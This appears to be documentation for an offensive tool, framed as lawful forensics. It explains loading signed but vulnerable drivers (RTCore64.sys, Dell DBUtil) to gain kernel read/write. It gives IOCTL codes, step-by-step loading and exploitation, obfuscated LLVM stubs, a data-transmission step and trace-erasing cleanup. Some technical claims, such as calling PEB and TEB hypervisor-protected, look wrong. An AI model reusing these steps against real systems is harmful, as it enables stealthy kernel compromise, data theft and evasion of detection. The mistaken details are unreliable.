# Kernel-Level Techniques (BYOVD)

BYOVD — **Bring Your Own Vulnerable Driver** — is a technique for gaining kernel-level access by loading a legitimate but vulnerable signed driver. Because the driver is legitimately signed, Windows driver signature enforcement (DSE) does not block it.

> **Authorization note:** BYOVD techniques require elevated privileges (SYSTEM or Administrator) on the target and must be explicitly authorized by the §69 warrant. This level of access should only be used when kernel-level forensic artifacts are specifically required by the investigation.

---

## Supported Drivers

JOCKY's `KernelDriverEmitter` includes IOCTL primitives for two well-known vulnerable drivers:

### RTCore64.sys

Vulnerable MSI Afterburner driver. IOCTLs provide arbitrary physical memory read/write.

| IOCTL | Code | Operation |
|-------|------|-----------|
| Read physical memory | `0x80002048` | Reads arbitrary physical address |
| Write physical memory | `0x8000204C` | Writes arbitrary physical address |

### DBUtil_2_3.sys (CVE-2021-21551)

Vulnerable Dell DBUtil driver. IOCTLs provide physical memory access and MSR read/write.

| IOCTL | Code | Operation |
|-------|------|-----------|
| Read physical memory | `0x9B0C1EC8` | Arbitrary physical read |
| Write physical memory | `0x9B0C1ECC` | Arbitrary physical write |

---

## Forensic Use Cases

Kernel-level access is required for:

| Artifact | Why Kernel Access is Needed |
|----------|-----------------------------|
| Full physical memory dump | User-space cannot access all physical pages |
| Kernel structures (EPROCESS, PEB, TEB) | Hypervisor-protected memory |
| Rootkit detection | Rootkits hide from user-space APIs; kernel view is authoritative |
| Hidden process detection | Compare kernel process list with user-space list |
| Driver analysis | Enumerate loaded kernel modules directly |

---

## How It Works

```
1. Drop RTCore64.sys to temp directory (signed — passes DSE)
2. CreateService / StartService → driver loads into kernel
3. Open device handle: CreateFile("\\\\.\\RTCore64")
4. Send IOCTL_READ_PHYSMEM (0x80002048) → read physical memory
   - For process forensics: read KPCR → EPROCESS list
   - For memory forensics: walk physical page map
5. Transmit collected kernel data
6. Stop and delete service → driver unloads → no persistent footprint
```

---

## LLVM IR Stubs

The `KernelDriverEmitter` generates LLVM IR stubs for each IOCTL:

```llvm
; RTCore64 physical memory read stub
define i64 @x3f7a1c_rtcore_read_phys(i64 %phys_addr, i64 %size) {
entry:
  %dev_handle = call i64 @x8b2d04_open_device(...)
  %ioctl_result = call i64 @x9c1e77_device_ioctl(
    i64 %dev_handle,
    i32 2147487816,      ; 0x80002048
    ...
  )
  ret i64 %ioctl_result
}
```

All function names are obfuscated by the PolyBuilder passes — the `@x3f7a1c_` prefix is a post-obfuscation example.

---

## Cleanup

After kernel collection completes, the driver is stopped and removed:

```
NtDeleteFile("\??\C:\Windows\Temp\drv.sys")
RegDeleteKey(HKLM\SYSTEM\CurrentControlSet\Services\<svc_name>)
```

This restores the target to its pre-operation state and satisfies the forensic principle of minimal impact.

---

## Prerequisites on Target

- Windows 10/11 or Server 2016–2022
- Administrator or SYSTEM privilege
- Secure Boot OFF (or enrolled in MOK/DBX), or driver pre-enrolled via custom policy
- Available temp directory with write permission
